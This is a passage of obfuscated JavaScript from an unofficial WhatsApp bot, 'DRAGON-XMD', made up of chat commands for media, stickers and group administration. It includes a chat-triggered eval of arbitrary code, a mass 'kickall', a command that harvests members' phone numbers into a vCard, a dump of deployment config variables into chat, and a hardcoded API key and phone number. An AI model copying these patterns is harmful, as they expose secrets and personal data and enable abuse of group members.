                'packname': _0x1b6245,
                'author': "DRAGON-XMD"
              });
            } catch (_0x51cd6e) {
              await _0x459d18("Qoute some text for quotely");
            }
          }
          break;
        case "fullpp":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            const {
              S_WHATSAPP_NET: _0x16a599
            } = require('@whiskeysockets/baileys');
            try {
              const _0x23ae57 = require('fs');
              if (!_0x37f12c) {
                _0x10d7a1.reply("𝗤𝘂𝗼𝘁𝗲 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲...");
                return;
              }
              ;
              let _0x520e5d;
              if (_0x37f12c.imageMessage) {
                _0x520e5d = _0x37f12c.imageMessage;
              } else {
                _0x10d7a1.reply("𝗛𝘂𝗵 𝘁𝗵𝗶𝘀 𝗶𝘀 𝗻𝗼𝘁 𝗮𝗻 𝗶𝗺𝗮𝗴𝗲...");
                return;
              }
              ;
              var _0x343a2b = await _0x34f9ed.downloadAndSaveMediaMessage(_0x520e5d);
              var {
                img: _0x3d2ee6
              } = await generateProfilePicture(_0x343a2b);
              _0x34f9ed.query({
                'tag': 'iq',
                'attrs': {
                  'target': undefined,
                  'to': _0x16a599,
                  'type': "set",
                  'xmlns': "w:profile:picture"
                },
                'content': [{
                  'tag': 'picture',
                  'attrs': {
                    'type': "image"
                  },
                  'content': _0x3d2ee6
                }]
              });
              _0x23ae57.unlinkSync(_0x343a2b);
              _0x10d7a1.reply("𝗣𝗿𝗼𝗳𝗶𝗹𝗲 𝗽𝗶𝗰𝘁𝘂𝗿𝗲 𝘂𝗽𝗱𝗮𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝗳𝘂𝗹𝗹𝘆✅");
            } catch (_0x39e31f) {
              _0x10d7a1.reply("An error occured while updating profile photo\n" + _0x39e31f);
            }
          }
          break;
        case 'upload':
        case "url":
          {
            let _0x5db458 = _0x10d7a1.quoted ? _0x10d7a1.quoted : _0x10d7a1;
            let _0x51b25e = (_0x5db458.msg || _0x5db458).mimetype || '';
            if (!_0x51b25e) {
              return _0x10d7a1.reply("Quote an image or video");
            }
            let _0x3fe13e = await _0x5db458.download();
            if (_0x3fe13e.length > 10485760) {
              return _0x10d7a1.reply("Media is too large.");
            }
            let _0x2a7c71 = /image\/(png|jpe?g|gif)|video\/mp4/.test(_0x51b25e);
            if (_0x2a7c71) {
              let _0x34ffc8 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x5db458);
              let _0x3ad449 = await uploadtoimgur(_0x34ffc8);
              _0x10d7a1.reply("Media Link:-\n\n" + _0x3ad449);
            } else {
              _0x10d7a1.reply("Error occured...");
            }
          }
          break;
        case "attp":
          if (!q) {
            return _0x459d18("I need text;");
          }
          _0x34f9ed.sendMessage(_0x10d7a1.chat, {
            'sticker': {
              'url': "https://api.lolhuman.xyz/api/attp?apikey=cde5404984da80591a2692b6&text=" + q
            }
          }, {
            'quoted': _0x10d7a1
          });
          break;
        case "smeme":
          {
            if (!/image/.test(_0x1dbbb8)) {
              return _0x459d18("Quote an image or sticker with the 2 texts separated with |");
            }
            if (!_0xe09539) {
              return _0x459d18("Quote an image or sticker with the 2 texts separated with |");
            }
            atas = _0xe09539.split('|')[0x0] ? _0xe09539.split('|')[0x0] : '-';
            bawah = _0xe09539.split('|')[0x1] ? _0xe09539.split('|')[0x1] : '-';
            let _0x25a757 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x2dc859);
            let _0x156678 = await uploadtoimgur(_0x25a757);
            let _0x5edebf = "https://api.memegen.link/images/custom/" + encodeURIComponent(bawah) + '/' + encodeURIComponent(atas) + ".png?background=" + _0x156678;
            let _0x3eb209 = await _0x34f9ed.sendImageAsSticker(_0x10d7a1.chat, _0x5edebf, _0x10d7a1, {
              'packname': packname
            });
            fs.unlinkSync(_0x3eb209);
          }
          break;
        case "compile-c":
          if (!_0xe09539 && !_0x10d7a1.quoted) {
            throw "Quote/tag a C code to compile";
          }
          const _0x36f4bf = _0x10d7a1.quoted ? _0x10d7a1.quoted.text ? _0x10d7a1.quoted.text : _0xe09539 ? _0xe09539 : _0x10d7a1.text : _0x10d7a1.text;
          let _0x14050c = c.runSource(_0x36f4bf);
          _0x14050c.then(_0x524f59 => {
            console.log(_0x524f59);
            _0x459d18(_0x524f59.stdout);
            _0x459d18(_0x524f59.stderr);
          })['catch'](_0x36c363 => {
            console.log(resultt3.stderr);
            _0x459d18(resultt3.stderr);
          });
          break;
        case "compile-c++":
          if (!_0xe09539 && !_0x10d7a1.quoted) {
            throw "Quote/tag a C++ code to compile";
          }
          const _0x321b0a = _0x10d7a1.quoted ? _0x10d7a1.quoted.text ? _0x10d7a1.quoted.text : _0xe09539 ? _0xe09539 : _0x10d7a1.text : _0x10d7a1.text;
          let _0x215d48 = cpp.runSource(_0x321b0a);
          _0x215d48.then(_0x52310 => {
            console.log(_0x52310);
            _0x459d18(_0x52310.stdout);
            _0x459d18(_0x52310.stderr);
          })["catch"](_0x3a1ba3 => {
            console.log(resultt4.stderr);
            _0x459d18(resultt4.stderr);
          });
          break;
        case "eval":
          {
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            if (!_0xe09539) {
              throw "Provide a valid Bot Baileys Function to evaluate";
            }
            try {
              let _0x2bbbbf = await eval(_0x586043.slice(0x2));
              if (typeof _0x2bbbbf !== "string") {
                _0x2bbbbf = require('util').inspect(_0x2bbbbf);
              }
              await _0x459d18(_0x2bbbbf);
            } catch (_0x104203) {
              await _0x459d18(String(_0x104203));
            }
          }
          break;
        case "add":
          if (!_0xe09539) {
            return _0x459d18("provide a number to be added in this format. \n\n add 254704009677");
          }
          if (!_0x10d7a1.isGroup) {
            throw group;
          }
          if (!_0x393450) {
            throw admin;
          }
          if (!_0xdf0d0e) {
            throw botAdmin;
          }
          await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [_0xe09539], 'add');
          _0x459d18("succesfully added");
          break;
        case 'kill':
        case 'kickall':
        case "terminate":
          if (!_0x10d7a1.isGroup) {
            throw group;
          }
          if (!_0xdf0d0e) {
            throw "I need admin previlleges to execute this command.";
          }
          if (!_0x22f9f0) {
            throw "Only DRAGON-XMD owner can use this command😲!";
          }
          let _0x4c79b5 = _0x1d7b4.filter(_0x5178da => _0x5178da.id != _0x34f9ed.decodeJid(_0x34f9ed.user.id)).map(_0x57d683 => _0x57d683.id);
          _0x10d7a1.reply("⚠️ Initializing Kick-all command💀...");
          setTimeout(() => {
            _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': "All parameters are configured, and Kick-all has been initialized and confirmed!. Now, Raven will remove all " + _0x4c79b5.length + " group participants in the next second.\n\nGoodbye Everyone! 👋\n\nTHIS PROCESS CANNOT BE TERMINATED💀!"
            }, {
              'quoted': _0x10d7a1
            });
            setTimeout(() => {
              _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, _0x4c79b5, "remove");
              setTimeout(() => {
                _0x10d7a1.reply("Done✅. All group participants have been removed. Do not always use this command to avoid Wa bans!");
              }, 0x3e8);
            }, 0x3e8);
          }, 0x3e8);
          break;
        case "system":
          _0x34f9ed.sendMessage(_0x10d7a1.chat, {
            'image': {
              'url': "https://i.imgur.com/PwXxe8q.jpeg"
            },
            'caption': "*𝐁𝐎𝐓 𝐍𝐀𝐌𝐄: 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗*\n\n*𝐒𝐏𝐄𝐄𝐃: " + _0x496d56.toFixed(0x4) + " 𝐌𝐒*\n\n*𝐑𝐔𝐍𝐓𝐈𝐌𝐄: " + runtime(process.uptime()) + "*\n\n*𝐏𝐋𝐀𝐓𝐅𝐎𝐑𝐌: 𝗛𝗲𝗿𝗼𝗸𝘂*\n\n*𝐇𝐎𝐒𝐓𝐍𝐀𝐌𝐄: 𝗗𝗿𝗮𝗴𝗼𝗻*\n\n*𝐋𝐈𝐁𝐑𝐀𝐑𝐘: Baileys*\n\n𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑: 𝗗𝗥𝗔𝗚𝗢𝗡"
          });
          break;
        case "vcf":
        case 'group-vcf':
          {
            if (!_0x10d7a1.isGroup) {
              return _0x10d7a1.reply("Command meant for groups");
            }
            const _0x52358d = require('fs');
            let _0x16c9ea = await _0x34f9ed.groupMetadata(_0x10d7a1.chat);
            let _0x340dc1 = '';
            let _0x4e0d02 = 0x0;
            for (let _0x3beb50 of _0x16c9ea.participants) {
              _0x340dc1 += "BEGIN:VCARD\nVERSION:3.0\nFN:[" + _0x4e0d02++ + "] +" + _0x3beb50.id.split('@')[0x0] + "\nTEL;type=CELL;type=VOICE;waid=" + _0x3beb50.id.split('@')[0x0] + ':+' + _0x3beb50.id.split('@')[0x0] + "\nEND:VCARD\n";
            }
            await _0x10d7a1.reply("𝗔 𝗺𝗼𝗺𝗲𝗻𝘁, 𝐃𝐑𝐀𝐆𝐎𝐍-𝐗𝐌𝐃 𝗶𝘀 𝗖𝗼𝗺𝗽𝗶𝗹𝗶𝗻𝗴 " + _0x16c9ea.participants.length + " 𝗖𝗼𝗻𝘁𝗮𝗰𝘁𝘀 𝗶𝗻𝘁𝗼 𝗮 𝗩𝗰𝗳...");
            await _0x52358d.writeFileSync("./contacts.vcf", _0x340dc1.trim());
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'document': _0x52358d.readFileSync("./contacts.vcf"),
              'mimetype': "text/vcard",
              'fileName': "Group contacts.vcf",
              'caption': "VCF for " + _0x16c9ea.subject + "\n" + _0x16c9ea.participants.length + " contacts"
            }, {
              'ephemeralExpiration': 0x15180,
              'quoted': _0x10d7a1
            });
            _0x52358d.unlinkSync("./contacts.vcf");
          }
          break;
        case "faker":
          if (!_0x10d7a1.isGroup) {
            throw group;
          }
          if (!_0xdf0d0e) {
            throw botAdmin;
          }
          if (!_0x393450) {
            throw admin;
          }
          let _0x4f0e32 = _0x1d7b4.filter(_0x2192e7 => !_0x2192e7.admin).map(_0x16276d => _0x16276d.id).filter(_0x31f47c => _0x31f47c.startsWith('1') && _0x31f47c != _0x34f9ed.decodeJid(_0x34f9ed.user.id));
          if (!_0x16f666 || !_0x16f666[0]) {
            if (_0x4f0e32.length == 0) {
              return _0x459d18("No virtual numbers detected!");
            }
            _0x10d7a1.reply("Dragon has detected " + _0x4f0e32.length + " members using +1 fake virtual WhatsApp accounts.  To remove them send faker -x");
          } else if (_0x16f666[0] == '-x') {
            await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [_0x4f0e32], "remove");
            await _0x10d7a1.reply(_0x4f0e32.length + " +1 fake accounts successfully removed!");
          }
          break;
        case "mail":
          {
            const {
              TempMail: _0x1fa210
            } = require("tempmail.lol");
            const _0x3fbdcb = new _0x1fa210();
            const _0x514654 = await _0x3fbdcb.createInbox();
            const _0x2c1b47 = '' + _0x514654.address;
            await _0x10d7a1.reply(_0x2c1b47);
            const _0x20e0a5 = await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': '' + _0x514654.token
            });
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'text': "Quoted text is your token. To fetch messages in your email use <.inbox your-token>"
            }, {
              'quoted': _0x20e0a5
            });
          }
          break;
        case "hacker2":
          {
            if (!/image/.test(_0x1dbbb8)) {
              return _0x10d7a1.reply("Hello hacker 👋, quote an image, probably a clear image of yourself or a person.");
            }
            let _0x571197 = await _0x34f9ed.downloadAndSaveMediaMessage(_0x2dc859);
            const _0x3df7bf = await uploadtoimgur(_0x571197);
            await UploadFileUgu();
            const _0x33dbd9 = "https://aemt.me/hacker2?link=" + _0x3df7bf;
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': _0x33dbd9
              },
              'caption': "Converted by Dragon! 🦄"
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case "inbox":
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("To fetch messages from your mail, provide the email address which was issued.");
            }
            const _0x193802 = encodeURIComponent(_0xe09539);
            const _0xc2eba9 = "https://tempmail.apinepdev.workers.dev/api/getmessage?email=" + _0x193802;
            try {
              const _0x49cb3b = await fetch(_0xc2eba9);
              if (!_0x49cb3b.ok) {
                return _0x10d7a1.reply(_0x49cb3b.status + " error occurred while communicating with API.");
              }
              const _0x2c2e8a = await _0x49cb3b.json();
              if (!_0x2c2e8a || !_0x2c2e8a.messages) {
                return _0x10d7a1.reply("I am unable to fetch messages from your mail, your inbox might be empty or some other error occurred.");
              }
              const _0x7b94a9 = _0x2c2e8a.messages;
              for (const _0x19d61f of _0x7b94a9) {
                const _0x452a75 = _0x19d61f.sender;
                const _0x582094 = _0x19d61f.subject;
                const _0x1635a9 = new Date(JSON.parse(_0x19d61f.message).date).toLocaleString();
                const _0x53d8eb = JSON.parse(_0x19d61f.message).body;
                const _0x2dd801 = "👥 Sender: " + _0x452a75 + "\n📝 Subject: " + _0x582094 + "\n🕜 Date: " + _0x1635a9 + "\n📩 Message: " + _0x53d8eb;
                await _0x10d7a1.reply(_0x2dd801);
              }
            } catch (_0x11b774) {
              console.error("𝗢𝗼𝗽𝘀 𝗘𝗿𝗿𝗼𝗿!");
              return _0x10d7a1.reply("𝗦𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝗶𝘀 𝘄𝗿𝗼𝗻𝗴!");
            }
          }
          break;
        case "anime":
        case "random-anime":
          {
            const _0x5b3ab9 = require("axios");
            try {
              const _0x499d8b = await _0x5b3ab9.get("https://api.jikan.moe/v4/random/anime");
              const _0x250445 = _0x499d8b.data.data;
              const _0x2d8d6c = _0x250445.title;
              const _0xf65b4 = _0x250445.synopsis;
              const _0x4e0031 = _0x250445.images.jpg.image_url;
              const _0x4e4cc9 = _0x250445.episodes;
              const _0xb71cfb = _0x250445.status;
              const _0x3068b1 = "📺 Title: " + _0x2d8d6c + "\n🎬 Épisodes: " + _0x4e4cc9 + "\n📡 Status: " + _0xb71cfb + "\n📝 Synopsis: " + _0xf65b4 + "\n🔗 URL: " + _0x250445.url;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'image': {
                  'url': _0x4e0031
                },
                'caption': _0x3068b1
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x2d7990) {
              _0x10d7a1.reply("𝗢𝗼𝗽𝘀 𝗘𝗿𝗿𝗼𝗿!");
            }
          }
          break;
        case "news":
          {
            const _0x210d95 = await fetch("https://fantox001-scrappy-api.vercel.app/technews/random");
            const _0x4bbdfe = await _0x210d95.json();
            const {
              thumbnail: _0x1ec047,
              news: _0x57d47c
            } = _0x4bbdfe;
            await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
              'image': {
                'url': _0x1ec047
              },
              'caption': _0x57d47c
            }, {
              'quoted': _0x10d7a1
            });
          }
          break;
        case 'approve':
        case "approve-all":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            const _0x31333b = await _0x34f9ed.groupRequestParticipantsList(_0x10d7a1.chat);
            if (_0x31333b.length === 0x0) {
              return _0x10d7a1.reply("𝗛𝘂𝗵, 𝗡𝗼 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗷𝗼𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘁𝗵𝗶𝘀 𝘁𝗶𝗺𝗲!");
            }
            for (const _0x7b3469 of _0x31333b) {
              const _0x32c607 = await _0x34f9ed.groupRequestParticipantsUpdate(_0x10d7a1.chat, [_0x7b3469.jid], "approve");
              console.log(_0x32c607);
            }
            _0x10d7a1.reply("𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 ℎ𝑎𝑠 𝑎𝑝𝑝𝑟𝑜𝑣𝑒𝑑 𝑎𝑙𝑙 𝑡ℎ𝑒 𝑝𝑒𝑛𝑑𝑖𝑛𝑔 𝑟𝑒𝑞𝑢𝑒𝑠𝑡𝑠 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦 ✅");
          }
          break;
        case "reject":
        case "reject-all":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            const _0xa5ee0e = await _0x34f9ed.groupRequestParticipantsList(_0x10d7a1.chat);
            if (_0xa5ee0e.length === 0x0) {
              return _0x10d7a1.reply("𝗛𝘂𝗵, 𝗡𝗼 𝗽𝗲𝗻𝗱𝗶𝗻𝗴 𝗷𝗼𝗶𝗻 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘁𝗵𝗶𝘀 𝘁𝗶𝗺𝗲");
            }
            for (const _0x5d16ff of _0xa5ee0e) {
              const _0x3cf468 = await _0x34f9ed.groupRequestParticipantsUpdate(_0x10d7a1.chat, [_0x5d16ff.jid], 'reject');
              console.log(_0x3cf468);
            }
            _0x10d7a1.reply("𝑃𝑒𝑛𝑑𝑖𝑛𝑔 𝑝𝑎𝑟𝑡𝑖𝑐𝑖𝑝𝑎𝑛𝑡𝑠 ℎ𝑎𝑣𝑒 𝑏𝑒𝑒𝑛 𝑟𝑒𝑗𝑒𝑐𝑡𝑒𝑑!");
          }
          break;
        case 'admin':
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x22f9f0) {
              throw NotOwner;
            }
            await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [_0x10d7a1.sender], 'promote');
            _0x10d7a1.reply("Promoted To Admin<🥇");
          }
          break;
        case 'getvar':
          if (!_0x22f9f0) {
            throw NotOwner;
          }
          const _0x5ecaf9 = new _0x8db52a({
            'token': herokuapi
          });
          let _0x8ac321 = "/apps/" + appname;
          let _0x4ebe07 = await _0x5ecaf9.get(_0x8ac321 + '/config-vars');
          let _0x309439 = "*𝗕𝗲𝗹𝗼𝘄 𝗔𝗿𝗲 𝗛𝗲𝗿𝗼𝗸𝘂 𝗩𝗮𝗿𝗶𝗮𝗯𝗹𝗲𝘀 𝗙𝗼𝗿 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗:*\n\n";
          for (vrt in _0x4ebe07) {
            _0x309439 += vrt + '=' + _0x4ebe07[vrt] + "\n\n";
          }
          _0x459d18(_0x309439);
          break;
        case 'restart':
          if (!_0x22f9f0) {
            throw NotOwner;
          }
          _0x459d18("𝐃𝐑𝐀𝐆𝐎𝐍-𝐗𝐌𝐃 𝐢𝐬 𝐫𝐞𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠. . .");
          await sleep(0xbb8);
          process.exit();
          break;
        case "remove":
        case "kick":
        case "toka":
          {
            if (!_0x10d7a1.isGroup) {
              throw group;
            }
            if (!_0xdf0d0e) {
              throw botAdmin;
            }
            if (!_0x393450) {
              throw admin;
            }
            if (!_0x10d7a1.quoted && (!_0x10d7a1.mentionedJid || _0x10d7a1.mentionedJid.length === 0x0)) {
              return _0x10d7a1.reply("Who should i remove !?");
            }
            let _0x22881c = _0x10d7a1.mentionedJid[0x0] ? _0x10d7a1.mentionedJid[0x0] : _0x10d7a1.quoted ? _0x10d7a1.quoted.sender : null;
            const _0x9c511a = _0x22881c.split('@')[0x0];
            if (_0x22881c == "254704009677@s.whatsapp.net") {
              return _0x10d7a1.reply("It's an Owners Number and she's allergic to Nonsense🤔");
            }
            if (_0x22881c == _0x34f9ed.decodeJid(_0x34f9ed.user.id)) {
              throw "I cannot remove Myself 😂";
            }
            _0x10d7a1.reply('@' + _0x9c511a + " Goodbye🖕");
            await _0x34f9ed.groupParticipantsUpdate(_0x10d7a1.chat, [_0x22881c], "remove");
          }
          break;
        case "instagram":
        case "igdl":
        case 'ig':
          {
            const {
              igdl: _0x413850
            } = require("ruhend-scraper");
            if (!_0xe09539) {
              return _0x10d7a1.reply("Please provide an Instagram link for the video.");
            }
            if (!_0xe09539.includes("https://www.instagram.com/")) {
              return _0x10d7a1.reply("That is not a valid Instagram link.");
            }
            try {
              const _0x578b42 = await _0x413850(_0xe09539);
              if (!_0x578b42 || !_0x578b42.data || _0x578b42.data.length === 0x0) {
                return _0x10d7a1.reply("No video found at the provided link.");
              }
              const _0x5d9c36 = _0x578b42.data;
              for (let _0x54a418 = 0x0; _0x54a418 < Math.min(0x14, _0x5d9c36.length); _0x54a418++) {
                const _0x3528b4 = _0x5d9c36[_0x54a418];
                const _0x3e3c81 = _0x3528b4.url;
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'video': {
                    'url': _0x3e3c81
                  },
                  'mimetype': "video/mp4",
                  'caption': "DOWNLOADED BY " + botname
                }, {
                  'quoted': _0x10d7a1
                });
              }
            } catch (_0x57f91d) {
              console.error(_0x57f91d);
              return _0x10d7a1.reply("An error occurred while processing the request.");
            }
          }
          break;
        case "twitter":
        case "twtdl":
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("𝗽𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝘁𝘄𝗶𝘁𝘁𝗲𝗿 𝗹𝗶𝗻𝗸 !");
            }
            try {
              const _0x3a1370 = await fetchJson("https://api.dreaded.site/api/alldl?url=" + _0xe09539);
              if (!_0x3a1370 || _0x3a1370.status !== 0xc8 || !_0x3a1370.data || !_0x3a1370.data.videoUrl) {
                return _0x10d7a1.reply("𝗦𝗼𝗿𝗿𝘆 𝘁𝗵𝗲 𝗔𝗣𝗜 𝗱𝗶𝗱𝗻'𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗰𝗼𝗿𝗿𝗲𝗰𝘁𝗹𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!");
              }
              const _0x1147b4 = _0x3a1370.data.videoUrl;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'video': {
                  'url': _0x1147b4
                },
                'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                'gifPlayback': false
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0xd5b30a) {
              _0x10d7a1.reply("An error occured. API might be down\n" + _0xd5b30a);
            }
          }
          break;
        case 'facebook':
        case 'fb':
        case "fbdl":
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("𝗣𝗿𝗼𝘃𝗶𝗱𝗲 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗮𝗰𝗲𝗯𝗼𝗼𝗸 𝗹𝗶𝗻𝗸 !");
            }
            if (!_0xe09539.includes('facebook.com')) {
              return _0x10d7a1.reply("That is not a facebook link.");
            }
            try {
              let _0x4b1ae8 = await fetchJson("https://api.dreaded.site/api/facebook?url=" + _0xe09539);
              if (!_0x4b1ae8 || _0x4b1ae8.status !== 0xc8 || !_0x4b1ae8.facebook || !_0x4b1ae8.facebook.sdVideo) {
                return _0x10d7a1.reply("𝗦𝗼𝗿𝗿𝘆 𝘁𝗵𝗲 𝗔𝗣𝗜 𝗱𝗶𝗱𝗻'𝘁 𝗿𝗲𝘀𝗽𝗼𝗻𝗱 𝗰𝗼𝗿𝗿𝗲𝗰𝘁𝗹𝘆. 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 𝗔𝗴𝗮𝗶𝗻 𝗹𝗮𝘁𝗲𝗿!");
              }
              const _0x4b0575 = _0x4b1ae8.facebook.sdVideo;
              if (!_0x4b0575) {
                return _0x10d7a1.reply("Wrong facebook data. Please ensure the video exists.");
              }
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'video': {
                  'url': _0x4b0575
                },
                'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                'gifPlayback': false
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x2e2eac) {
              console.error("Error occurred:", _0x2e2eac);
              _0x10d7a1.reply("An error occurred. API might be down. Error: " + _0x2e2eac.message);
            }
          }
          break;
        case "tiktok":
        case "tikdl":
          {
            if (!_0xe09539) {
              return _0x10d7a1.reply("Please provide a TikTok video link.");
            }
            try {
              const _0x263f5c = await axios.get("https://bk9.fun/download/tiktok?url=" + encodeURIComponent(_0xe09539));
              if (_0x263f5c.data.status && _0x263f5c.data.BK9) {
                const _0x1c824c = _0x263f5c.data.BK9.BK9;
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'text': "𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 𝐹𝑒𝑡𝑐ℎ𝑒𝑑 𝑑𝑎𝑡𝑎 𝑠𝑢𝑐𝑐𝑒𝑠𝑠𝑓𝑢𝑙𝑙𝑦✅ 𝑤𝑎𝑖𝑡 𝑎 𝑚𝑜𝑚𝑒𝑛𝑡. . ."
                }, {
                  'quoted': _0x10d7a1
                });
                await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                  'video': {
                    'url': _0x1c824c
                  },
                  'caption': "𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗𝗘𝗗 𝗕𝗬 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗",
                  'gifPlayback': false
                }, {
                  'quoted': _0x10d7a1
                });
              } else {
                _0x459d18("Failed to retrieve video from the provided link.");
              }
            } catch (_0x38173f) {
              _0x459d18("An error occurred during download: " + _0x38173f.message);
            }
          }
          break;
        case "song":
          {
            const _0x1e0c8a = require('yt-search');
            try {
              if (!_0xe09539) {
                return _0x10d7a1.reply("What song do you want to download?");
              }
              const {
                videos: _0x263dd5
              } = await _0x1e0c8a(_0xe09539);
              if (!_0x263dd5 || _0x263dd5.length === 0x0) {
                return _0x10d7a1.reply("No songs found!");
              }
              await _0x10d7a1.reply("_Please wait your download is in progress_");
              const _0x1f0f29 = _0x263dd5[0x0].url;
              let _0xd57d = await fetchJson("https://api.dreaded.site/api/ytdl/audio?url=" + _0x1f0f29);
              if (!_0xd57d || !_0xd57d.result || !_0xd57d.result.url) {
                return _0x10d7a1.reply("Failed to fetch audio from the API.");
              }
              const _0x4a56c7 = _0xd57d.result.url;
              const _0x591a48 = _0xd57d.result.title;
              await _0x34f9ed.sendMessage(_0x10d7a1.chat, {
                'audio': {
                  'url': _0x4a56c7
                },
                'mimetype': 'audio/mpeg',
                'fileName': _0x591a48 + ".mp3"
              }, {
                'quoted': _0x10d7a1
              });
            } catch (_0x429865) {
              _0x10d7a1.reply("Download failed\n" + _0x429865.message);
            }
          }
          break;
        case 'sc':
        case "script":
        case 'repo':
          _0x34f9ed.sendMessage(_0x10d7a1.chat, {
            'image': {
              'url': 'https://i.imgur.com/A08nrWx.jpeg'
            },
            'caption': " Hello👋 *" + _0x1b6245 + "*,You can deploy 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗 using the GitHub link below 𓅂\n\nFork and give us a star✨.\n\n https://github.com/Viniznimco/DRAGON-XMD\n\nLink with your whatsapp using pairing link below\n\nhttps://msnapdragon-junior-session.onrender.com\n\nCopy the session_id and Fill in the required Variables before Deploy\n\nEnjoy and have fun with ░𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗░\n\n𝗠𝗮𝗱𝗲 𝗶𝗻 𝗞𝗲𝗻𝘆𝗮 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡!\n\n𝘁𝗲𝘅𝘁 𝘆𝗼𝘂𝗿 𝗳𝗮𝘃𝗼𝘂𝗿𝗶𝘁𝗲 𝗱𝗲𝗽𝗹𝗼𝘆𝗲𝗿 𝗮𝗻𝗱 𝘀𝗵𝗮𝗿𝗲 𝘁𝗵𝗲 𝘀𝗲𝘀𝘀𝗶𝗼𝗻 𝗶𝗱 𝘁𝗼 𝗵𝗶𝗺/𝗵𝗲𝗿\n\n© 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡"
          }, {
            'quoted': _0x10d7a1
          });
          break;
        case "closetime":
          if (!_0x10d7a1.isGroup) {
            throw group;
          }
          if (!_0x393450) {
            throw admin;
          }
          if (!_0xdf0d0e) {
            throw botAdmin;
          }
          if (_0x16f666[0x1] == "second") {
            var _0xe8f545 = _0x16f666[0x0] * "1000";
          } else {
            if (_0x16f666[0x1] == "minute") {
              var _0xe8f545 = _0x16f666[0x0] * "60000";
            } else {
              if (_0x16f666[0x1] == 'hour') {
                var _0xe8f545 = _0x16f666[0x0] * "3600000";
              } else {
                if (_0x16f666[0x1] == "day") {
                  var _0xe8f545 = _0x16f666[0x0] * "86400000";
                } else {
                  return _0x459d18("*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second");
                }
              }
            }
          }
          _0x459d18("Countdown of  " + q + " starting from now to close the group");
          setTimeout(() => {
            _0x34f9ed.groupSettingUpdate(_0x10d7a1.chat, "announcement");
            _0x459d18("𝗚𝗿𝗼𝘂𝗽 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗰𝗹𝗼𝘀𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗯𝘆 𝗗𝗥𝗔𝗚𝗢𝗡-𝗫𝗠𝗗");
          }, _0xe8f545);
          break;
        case "opentime":
          if (!_0x10d7a1.isGroup) {
            throw group;
          }
          if (!_0x393450) {
            throw admin;
          }
          if (!_0xdf0d0e) {
            throw botAdmin;
          }
          if (_0x16f666[0x1] == "second") {
